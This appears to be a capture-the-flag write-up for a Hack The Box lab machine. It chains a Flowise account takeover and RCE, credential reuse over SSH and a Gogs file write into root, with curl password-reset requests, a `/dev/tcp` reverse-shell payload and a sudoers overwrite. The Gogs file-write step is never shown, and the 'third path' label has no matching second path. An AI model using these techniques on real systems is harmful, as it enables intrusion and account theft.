# Silentium — HTB Writeup

**Machine:** Silentium  
**IP:** `<ATT-IP>`  
**OS:** Ubuntu 24.04.4 LTS (host) + Alpine Linux 3.22 (Docker container)  
**Difficulty:** Hard

---

## 1. Initial Recon

### Port scan

```bash
nmap -p- --min-rate 5000 -T4 <ATT-IP>
```

**Open ports:**

- `22/tcp` — SSH
- `80/tcp` — nginx

### Add host

```bash
echo "<ATT-IP> silentium.htb" | sudo tee -a /etc/hosts
```

### Vhost fuzzing

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://silentium.htb/ \
     -H "Host: FUZZ.silentium.htb" \
     -fs <size>
```

**Discovered:**

- `staging.silentium.htb` — Flowise
- `staging-v2-code.dev.silentium.htb` — Gogs

Add the Flowise host:

```bash
echo "<ATT-IP> staging.silentium.htb" | sudo tee -a /etc/hosts
```

---

## 2. Flowise Enumeration

Check the Flowise version:

```bash
curl -s http://staging.silentium.htb/api/v1/version
```

Response:

```json
{"version":"3.0.5"}
```

Flowise `3.0.5` is vulnerable to:

- **CVE-2025-58434** — unauthenticated account takeover via forgot-password token leak
- **CVE-2025-59528** — authenticated RCE via CustomMCP

Both vulnerabilities were fixed in Flowise `3.0.6`.

### Extract email address from the JavaScript bundle

Download the main JavaScript bundle:

```bash
curl -s http://staging.silentium.htb/assets/index-C6GKaUTA.js -o bundle.js
```

Search for email addresses:

```bash
grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' bundle.js | sort -u
```

Found:

```text
ben@silentium.htb
```

### Confirm the password-reset flow

```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

---

## 3. Account Takeover — CVE-2025-58434

The leaked password-reset token can be used to set a new password.

### Reset password

```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb","password":"Pwn3d!2026","token":"<TOKEN>"}}'
```

Log in at:

```text
http://staging.silentium.htb/signin
```

Credentials:

```text
Email:    ben@silentium.htb
Password: Pwn3d!2026
```

After logging in, obtain the Flowise API key from:

```text
/apikey
```

---

## 4. RCE in Flowise — CVE-2025-59528

Use the authenticated CustomMCP RCE vulnerability to obtain command execution inside the Flowise container.

Example exploit invocation:

```bash
python3 flowise_chain.py \
  -t http://staging.silentium.htb \
  --api-key <KEY> \
  --lhost <ATT-IP> \
  --lport 4444
```

Start a listener:

```bash
nc -lvnp 4444
```

The resulting shell is:

```text
uid=0(root)
```

Confirm that the shell is inside a Docker container:

```bash
ls -la /.dockerenv
```

---

## 5. Container Enumeration

Check environment variables:

```bash
env
```

Relevant values:

```text
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_HOST=mailhog
SMTP_USER=test
SMTP_PASSWORD=r04D!!_R4ge
SENDER_EMAIL=ben@silentium.htb
```

### Important findings

#### `SENDER_EMAIL`

```text
SENDER_EMAIL=ben@silentium.htb
```

This strongly suggests that `ben` is a host user.

#### `SMTP_PASSWORD`

```text
SMTP_PASSWORD=r04D!!_R4ge
```

The password is reused and can be tested against SSH for the `ben` account.

#### `SMTP_HOST`

```text
SMTP_HOST=mailhog
```

This reveals another container/service on the internal Docker network.

### Check container capabilities

```bash
cat /proc/self/status | grep Cap
```

Result:

```text
CapEff: 00000000a00425fb
```

There is no `CAP_SYS_ADMIN`, so a straightforward container escape is not available.

### Search Flowise's database

```bash
strings /root/.flowise/database.sqlite | grep -iE 'HTB|flag'
```

No flag was found.

---

## 6. SSH to the Host

The reused password works for the `ben` account on the host:

```bash
ssh ben@<ATT-IP>
```

Password:

```text
r04D!!_R4ge
```

Confirm the account:

```bash
id
```

Output:

```text
uid=1000(ben) groups=1000(ben),100(users)
```

Check the hostname:

```bash
hostname
```

Output:

```text
silentium
```

Check sudo permissions:

```bash
sudo -l
```

No useful sudo permissions are available at this stage.

---

## 7. Host Enumeration

Inspect the nginx configuration:

```bash
cat /etc/nginx/sites-enabled/staging-v2-code
```

Configuration:

```nginx
server {
    listen 80;
    server_name staging-v2-code.dev.silentium.htb;

    location / {
        proxy_pass http://127.0.0.1:3001;
    }
}
```

This reveals a Gogs instance listening internally on:

```text
127.0.0.1:3001
```

### Process enumeration

```bash
ps aux | grep root
```

Relevant processes:

```text
root ... /opt/gogs/gogs/gogs web
root ... dockerd
```

An important finding is that **Gogs is running as root**.

### Docker socket

```bash
ls -la /var/run/docker.sock
```

Result:

```text
srw-rw---- root docker
```

The `ben` account is not a member of the `docker` group:

```bash
groups
```

```text
ben users
```

Therefore, the Docker socket is not directly exploitable from the `ben` account.

---

## 8. Gogs Access

Add the internal Gogs hostname:

```bash
echo "<ATT-IP> staging-v2-code.dev.silentium.htb" | sudo tee -a /etc/hosts
```

Open:

```text
http://staging-v2-code.dev.silentium.htb/
```

Register a local account:

```text
Username: test
Password: test
```

After logging in, generate an API token from:

```text
/user/settings/applications
```

---


## 9. Root via `/etc/sudoers.d/ben`

One straightforward exploitation path is to overwrite:

```text
/etc/sudoers.d/ben
```

with:

```text
ben ALL=(ALL) NOPASSWD:ALL
```

Once the file is successfully written, run:

```bash
sudo su
```

Then:

```bash
cat /root/root.txt
```

The machine is now fully compromised.

---

## 10. Alternative RCE — `.git/config`

A third exploitation path is to abuse Git's `sshCommand` configuration.

### Basic idea

Log in to Gogs using:

```text
test:test
```

Generate an API token and create a repository.

Clone the repository locally and create a symlink targeting:

```text
.git/config
```

The malicious configuration can contain an `sshCommand`, for example:

```ini
sshCommand = bash -c 'bash -i >& /dev/tcp/<ATT-IP>/4444 0>&1'
```

The important detail is that merely writing `.git/config` does **not** immediately execute the command.

The `sshCommand` is triggered by a subsequent Git operation that invokes SSH.

### Triggering the payload

Possible triggers include:

```text
POST /api/v1/repos/.../mirror-sync
```

or another Git operation such as a push/fetch initiated through the Gogs interface.

In this case, packet capture showed a connection attempt to:

```text
<ATT-IP>:4444
```

However, the `nc` listener did not successfully handle the connection.

Using `ncat` or `socat` can be more reliable for this type of reverse shell.

---

## 11. Root

After exploiting the Gogs arbitrary file write:

```bash
sudo su
```

Verify:

```bash
id
```

Then retrieve the root flag:

```bash
cat /root/root.txt
```

```text
HTB{...}
```

---


# Final Takeaway

The machine demonstrates a multi-stage attack where each foothold enables the next:

```text
Web enumeration
    ↓
Flowise vulnerability
    ↓
Account takeover
    ↓
Authenticated RCE
    ↓
Container enumeration
    ↓
Credential reuse
    ↓
SSH access to host
    ↓
Internal Gogs discovery
    ↓
Gogs vulnerability
    ↓
Root file write
    ↓
Host root
```

The most important pivot was recognizing that the credentials exposed inside the Flowise container were useful for **host-level SSH access**, rather than spending time trying to escape the container directly.
